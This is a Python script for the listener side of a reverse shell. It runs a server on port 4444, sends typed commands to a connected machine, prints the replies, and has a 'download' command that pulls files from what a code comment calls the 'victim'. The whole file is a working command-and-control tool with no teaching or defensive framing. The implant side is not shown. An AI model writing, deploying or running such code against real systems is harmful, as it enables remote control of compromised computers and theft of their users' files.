import socket  
import os  

HOST = '0.0.0.0'  
PORT = 4444  

def handle_client(client_socket):  
    while True:  
        cmd = input("$ ")  
        client_socket.send(cmd.encode())  
        if cmd.lower() == 'exit':  
            break  
        elif cmd.startswith('download'):  
            # Receive file from victim  
            file_name = cmd.split(' ', 1)[1]  # Fix: Use split with maxsplit=1
            data = b''  # Store all received data
            
            # Receive until EOF marker
            while True:  
                chunk = client_socket.recv(4096)  
                if chunk.endswith(b'EOF'):  
                    data += chunk[:-3]  # Remove EOF marker  
                    break  
                data += chunk  
            
            # Check if data is an error message
            if data.startswith(b'Error:'):  
                print(f"[!] {data.decode()}")  
            else:  
                with open(file_name, 'wb') as f:  
                    f.write(data)  
                print(f"[+] File '{file_name}' downloaded successfully.")  
        else:  
            response = client_socket.recv(4096).decode()  
            print(response)  

def main():  
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    server.bind((HOST, PORT))  
    server.listen(5)  
    print(f"[*] Listening on {HOST}:{PORT}")  
    client_socket, addr = server.accept()  
    print(f"[+] Connection from {addr[0]}:{addr[1]}")  
    handle_client(client_socket)  

if __name__ == "__main__":  
    main()